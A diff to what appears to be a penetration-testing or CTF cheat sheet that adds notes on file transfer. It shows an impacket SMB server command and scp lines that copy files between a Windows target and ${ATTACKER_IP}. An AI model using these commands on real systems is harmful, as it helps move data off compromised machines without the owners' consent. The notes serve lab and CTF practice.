@@ -48,7 +48,10 @@ for machine in $(cat machines.txt); do; crackmapexec smb $machine ...; done;
 (note, this is just an example, as crackmapexec in fact supports jut getting the machine IPs from a machines.txt file natively).
 
 
-## File transfer from Windows to Attack box
+## File transfer
+
+
+### From Windows Target to Attack box
 
 If you find yourself on a windows shell and want to transfer files from the target to the attack box,
 you can start an SMB server on the attackbox:
@@ -57,4 +60,21 @@ you can start an SMB server on the attackbox:
 impacket-smbserver SHARE $(pwd) -smb2support -user ${SOME_USERNAME} -password ${SOME_PW}
 ```
 (Note that this makes a public server. Only without setting user/password in CTF scenarios in private networks).
+
+### SCP to copy
+
+Assuming you have ssh started on your kali machine, we can do:
+
+```
+scp path/to/file ${USER}@${ATTACKER_IP}:/full/path/to/dest
+```
+or the other way:
+
+```
+scp ${USER}@${ATTACKER_IP}:/full/path/to/file path/to/dest
+```
+
+Works on modern windows boxes too.
+
+
 
